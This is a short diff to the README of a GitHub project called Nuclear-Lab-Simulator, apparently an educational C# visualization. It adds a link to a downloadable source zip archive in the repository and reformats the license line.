@@ -13,6 +13,8 @@ Open **[Releases](https://github.com/siddop422/Nuclear-Lab-Simulator/releases)**
 
 The Windows build is published as a **self-contained, single-file x64 executable**. The .NET runtime does not need to be installed separately.
 
+Download the complete [source project archive](https://raw.githubusercontent.com/siddop422/Nuclear-Lab-Simulator/main/Nuclear-Lab-Simulator-source.zip) to inspect or build the C# project locally.
+
 For builds from the latest source, open **[Actions](https://github.com/siddop422/Nuclear-Lab-Simulator/actions)** and download the `NuclearLabSimulator-windows-x64` artifact from a successful run.
 
 ## Run from source
@@ -54,4 +56,4 @@ This is an **educational visualization**, not a validated scientific solver. It 
 
 ## License
 
-MIT. See [LICENSE](LICENSE).
+MIT. See `LICENSE`.
